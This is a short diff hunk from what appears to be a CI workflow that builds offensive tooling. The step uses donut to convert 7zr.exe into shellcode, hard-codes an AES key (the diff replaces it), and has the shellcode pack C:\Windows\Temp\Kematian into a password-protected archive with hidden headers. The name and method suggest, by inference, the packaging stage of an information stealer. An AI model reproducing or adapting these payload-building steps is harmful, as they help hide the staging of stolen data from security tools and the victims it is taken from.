@@ -50,7 +50,7 @@ jobs:
     - name: Convert 7zr to Shellcode with Encryption Key 
       run: |
         Write-Host "Using a static encryption key" 
-        $aeskey = "ip1j5zFgal2nd2y0TDUU7Q=="
+        $aeskey = "5hvE73vXM9oWd5MJi+PKyE0XJRRgu3kfw5mq5CEVYys="
         Write-Host "Decryption KEY: $aeskey" 
         $arguments = "a -t7z -mx=9 -mhe=on Kematian.7z C:\Windows\Temp\Kematian -p$aeskey"
         .\donut\donut.exe -i frontend-src\7zr.exe -x2 -a2 -p $arguments -o 7zr.bin -z 4
